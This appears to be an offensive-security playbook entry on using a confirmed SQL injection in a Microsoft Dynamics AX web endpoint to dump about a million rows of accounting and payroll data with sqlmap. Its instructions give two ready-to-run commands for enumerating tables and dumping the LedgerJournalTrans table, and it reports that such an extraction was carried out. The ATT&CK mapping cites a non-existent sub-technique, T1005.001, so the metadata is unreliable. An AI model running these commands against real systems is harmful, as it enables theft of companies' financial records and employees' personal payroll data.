---
id: p-dump-db-sqlmap
tags:
  - data-exfil
  - dump
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-dump-table]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T03:15:10.305Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques:
  - '[[T1005.001]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Dump Database Contents with sqlmap

## Summary

Extract sensitive tables from the database using sqlmap, targeting main accounting tables in Microsoft Dynamics AX.

## Description

After researching schema, dumped LedgerJournalTrans table, extracting ~1M rows of financial/payroll data up to previous year.

## Requirements

1. Confirmed SQLi access
2. Database schema knowledge
3. Sufficient time for blind extraction

## Defense

- Encrypt sensitive data
- Implement row-level security
- Audit query logs for dumps

## Objectives

1. Exfil sensitive data
2. Assess impact
3. Identify payroll/financial info

## Instructions

### Step 1: Enumerate Tables

**Context**: List databases and tables.

**Command** ([[commands/sqlmap-enum-tables]]):
```bash
sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dbs --tables -D dynamics_ax_db
```

> Expected output: List including LedgerJournalTrans.

### Step 2: Dump Target Table

**Context**: Extract all columns.

**Command** ([[commands/sqlmap-dump-table]]):
```bash
sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dump -T LedgerJournalTrans -D dynamics_ax_db --start=1 --stop=1000000
```

> Expected output: CSV/JSON dump of ~1M entries with accounts, invoices, payroll.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Local System]]

### Sub-Techniques

- [[T1005.001]]

## Commands Used

- [[commands/sqlmap-enum-tables]]
- [[commands/sqlmap-dump-table]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- exfil
- mssql
